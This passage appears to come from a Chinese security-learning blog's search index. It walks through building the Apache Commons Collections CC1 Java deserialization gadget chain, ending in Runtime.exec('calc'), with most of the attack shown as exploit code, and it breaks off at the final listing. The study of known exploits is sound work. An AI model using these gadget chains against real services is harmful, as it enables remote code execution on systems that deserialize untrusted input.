class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D://CC6.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化CC链1</title>
      <link href="/2025/05/15/JavaCC%E9%93%BE1/"/>
      <url>/2025/05/15/JavaCC%E9%93%BE1/</url>
      
        <content type="html"><![CDATA[<h3 id="执行类sink"><a href="#执行类sink" class="headerlink" title="执行类sink"></a>执行类sink</h3><p><font style="color:#080808;background-color:#ffffff;">Transformer接口下的实现类InvokerTransformer</font></p><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><font style="color:#080808;background-color:#ffffff;">条件：</font></h4><p><font style="color:#080808;background-color:#ffffff;">继承了Serializable</font></p><h4 id="关键方法："><a href="#关键方法：" class="headerlink" title="关键方法："></a><font style="color:#080808;background-color:#ffffff;">关键方法：</font></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//获取传入对象的类</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="comment">//获取传入对象中的某一个方法以及对应的参数类型</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            <span class="comment">//通过反射调用类的方法，并传入参数，显然是利用点，且参数都是可控的。</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">根据有参构造参数可知所有的参数都是可控的</font></p><p><font style="color:#080808;background-color:#ffffff;">回顾一下反射如何调用runtime的exec方法</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">Class c=r.getClass();</span><br><span class="line">Method m=c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>尝试使用transformer来调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;); <span class="comment">//方法名为exec，参数类型为String，参数值为calc</span></span><br><span class="line">invokerTransformer.transform(r);</span><br></pre></td></tr></table></figure><h2 id="gadget-chain调用链"><a href="#gadget-chain调用链" class="headerlink" title="gadget chain调用链"></a>gadget chain调用链</h2><h3 id="step1（寻找调用了transform方法的方法）"><a href="#step1（寻找调用了transform方法的方法）" class="headerlink" title="step1（寻找调用了transform方法的方法）"></a>step1（寻找调用了transform方法的方法）</h3><p>想要调用InvokerTransformer对象中的transform方法，就寻找调用了方法名为transform方法的代码，在transformedmap文件中找到了其中的checksetvalue中存在一个调用了transform方法的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了一个调用了transform方法的类还不够，我们还需要确认valueTransformer参数可控，才能实现调用InvokerTransformer类中的transform方法。找到他的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现valueTransformer参数可控。满足两个条件，调用同名方法，并且对象可控。但是存在一个问题，这里的类都是protected方法，也就是说仅允许类内部访问。所以我们就需要找到内部实例化方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现decorate方法可以进行构造，就解决了构造方法无法调用的问题。接下来的思路就是解决如何调用checksetvalue方法了。</p><h3 id="step2（寻找合适的调用了checksetvalue方法的方法）"><a href="#step2（寻找合适的调用了checksetvalue方法的方法）" class="headerlink" title="step2（寻找合适的调用了checksetvalue方法的方法）"></a>step2（寻找合适的调用了checksetvalue方法的方法）</h3><p>查找checksetvalue，发现在类<font style="color:#080808;background-color:#ffffff;">AbstractInputCheckedMapDecorator中的副类MapEntry中的setValue方法调用了checkSetValue方法。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了parent对象的check’setvalue方法，我们需要审计parent变量是否可控，查看构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(entry);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parent方法可控。而这个副类重写了<font style="color:#080808;background-color:#ffffff;">AbstractMapEntryDecorator类中的setvalue方法，我们查看AbstractMapEntryDecorator类中的setvalue方法。</font></p><p><img src="/img/JavaCC1/1747126429672-bbc2c736-1af4-4d3f-ba91-fcad988730da.png"></p><p>发现这个类继承了map.entry接口，这就意味着我们只需要通过map遍历即可调用到setvalue方法。</p><p><img src="/img/JavaCC1/1747126498795-075da897-6823-48f8-81f0-e5e84a7d54d7.png"></p><p>梳理一下：</p><p>sink（执行类）</p><p><font style="color:#080808;background-color:#ffffff;">Transformer接口下的实现类InvokerTransformer内部的transform方法</font></p><p><font style="color:#080808;background-color:#ffffff;">gadget chain（调用链）</font></p><p><font style="color:#080808;background-color:#ffffff;">TransformedMap中的checkSetValue方法调用了transform方法，且对象可控。</font></p><p><font style="color:#080808;background-color:#ffffff;">由于构造方法和checksetvalue方法都是protected方法所以需要找到一个内部实例化的方法，于是找到了decorate方法，解决构造方法无法外部调用的问题。</font></p><p><font style="color:#080808;background-color:#ffffff;">然后我们要寻找合适的能够调用checksetvalue方法的代码，于是我们找到了AbstractInputCheckedMapDecorator类，在这个类中的副类MapEntry类，发现内部的setvalue方法调用了checksetvalue方法，且其中的对象parent可控。</font></p><p><font style="color:#080808;background-color:#ffffff;">且这个副类所继承的类，他又继承了Map.Entry接口类，这就使得它可以再进行map遍历时调用键中所指示的对象的类的setvalue方法，实现调用副类MapEntry中的setvalue方法，并通过这个setvalue方法调用到checksetvalue方法。</font></p><p><font style="color:#080808;background-color:#ffffff;">如下的代码实现了上述调用链的流程</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line"></span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// invokerTransformer.transform(r); &lt;--- 相当于下面的代码是模拟这行代码，实现相同的功能</span></span><br><span class="line"></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"> map.put(<span class="string">&quot;gxngxngxn&quot;</span>,<span class="string">&quot;gxngxngxn&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.*decorate*(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet()) &#123; <span class="comment">//遍历Map常用格式</span></span><br><span class="line">         entry.setValue(r);                       <span class="comment">//调用setValue方法，并把对象r当作对象传入</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">建议调试运行一下。</font></p><p><font style="color:#080808;background-color:#ffffff;">但这并不是我们最终想要达到的效果，虽然通过map遍历可以实现调用链，但是我们还是需要一个readObject方法或者其他调用了setvalue方法名的方法，替代掉遍历map这个操作。</font></p><h2 id="入口类（寻找合适setvalue调用）"><a href="#入口类（寻找合适setvalue调用）" class="headerlink" title="入口类（寻找合适setvalue调用）"></a><font style="color:#080808;background-color:#ffffff;">入口类（寻找合适setvalue调用）</font></h2><p>我们在<font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler类中的readobject方法中找到了setvalue的调用。</font></p><p><img src="/img/JavaCC1/1747289008024-bbfd4f21-062e-43be-9198-0891ed128117.png"></p><p>接下来寻找这个类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察这个构造器我们可见membervalues这个参数是可控的。但是存在一个问题，就是这个类的定义，并没有写public这类的声明，也就意味着，这个方法只能在这个包内部调用。如果想要调用这个类就需要使用反射来调用。</p><p><img src="/img/JavaCC1/1747289366516-e57a4204-b988-4f05-9c29-8523c303a044.png"></p><p>根据分析我们就可以开始构造利用的代码了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//创建runtime对象</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//创建sink执行类对象</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;gxngxngxn&quot;</span>,<span class="string">&quot;gxngxngxn&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        constructor.newInstance(Override.class,transformedmap);</span><br><span class="line">        serialize(c);</span><br><span class="line">        unserialize(<span class="string">&quot;D://CC1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D://CC1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这段代码运行后无法进行命令执行，为什么？我们逐个分析一下。</p><h3 id="problem1（runtime类未继承serializable接口）"><a href="#problem1（runtime类未继承serializable接口）" class="headerlink" title="problem1（runtime类未继承serializable接口）"></a>problem1（runtime类未继承serializable接口）</h3><p>来到runtime类中。</p><p><img src="/img/JavaCC1/1747290305166-c8eb712c-73c5-41b6-83d0-fc3d87b59335.png"></p><p>发现他没有继承serializable接口，所以无法被序列化。那么接下来如何操作？我们知道它的原型类class是继承了serializable接口的，所以是可以序列化的。</p><p><img src="/img/JavaCC1/1747290713671-8d97b437-d47a-492c-a08e-91365c60de53.png"></p><p>那么我们如何获取一个runtime的对象呢？</p><p><img src="/img/JavaCC1/1747290793156-b1a1155e-8285-4adb-ab20-3eb935073bb0.png"></p><p>可以看到这里存在一个静态方法，它会返回一个runtime对象。所以我们可以利用反射实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);              <span class="comment">//获取实例化对象，因为该方法无无参方法，所以全为null</span></span><br><span class="line">Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>利用上述操作我们就可以解决runtime类无法序列化的问题。根据上述代码为我们修改利用代码中的transform部分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//获取类原型</span></span><br><span class="line">Method getRuntime= (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="comment">//模拟获取getruntime方法</span></span><br><span class="line">Runtime r=(Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"><span class="comment">//获取invoke方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"><span class="comment">//进行命令执行</span></span><br></pre></td></tr></table></figure><p>但这样嵌套创建较为麻烦，所以这里使用了Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法</p><p><img src="/img/JavaCC1/1747291257691-747698af-58d1-4d77-b364-9c8bd930f1ca.png"></p><p>修改一下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>到这里就解决了第一个问题，runtime对象无法序列化，但是这样仍然无法实现命令执行。因为还存在一个问题。</p><h3 id="problem2（member判断）"><a href="#problem2（member判断）" class="headerlink" title="problem2（member判断）"></a>problem2（member判断）</h3><p><img src="/img/JavaCC1/1747292402548-8f27a677-7421-495b-a6da-a15b884821b1.png"></p><p>在我们调用的<font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler</font>类的readobject方法中存在两个判断，一个是判断membertype是否为空，先看第一个，我们打上断点看一下变量。</p><p><img src="/img/JavaCC1/1747292691111-57a1714e-450d-4c97-88ca-c929533340f0.png"></p><p>发现membertype为null自然无法第一个判断未通过直接结束了。这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解override是没有成员变量的。而另一个注解target存在一个变量。所以我们把注解换为target并把第一个键值对的值修改为value即可通过判断。按理来说我们现在允许应当可以正常进行命令执行，但是仍旧失败了，为什么？</p><h3 id="problem3（value值非预期value）"><a href="#problem3（value值非预期value）" class="headerlink" title="problem3（value值非预期value）"></a>problem3（value值非预期value）</h3><p><img src="/img/JavaCC1/1747293521388-3d8eac56-35c3-44f1-b3f4-b33187d85f07.png"></p><p>debug发现，传入的value不是我们所期望的runtime.class，如何将他改为我们期望的runtime.class?</p><p>这里就需要ConstantTransformer类，我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为Runtime.class</p><p><img src="/img/JavaCC1/1747293668621-1ffdd3b1-da08-40f9-bfc9-32d00387fd6f.png"></p><p>这样就解决了传入的value非预期的情况。修改后再次运行成功进行命令执行。</p><h2 id="完整代码如下："><a href="#完整代码如下：" class="headerlink" title="完整代码如下："></a>完整代码如下：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span 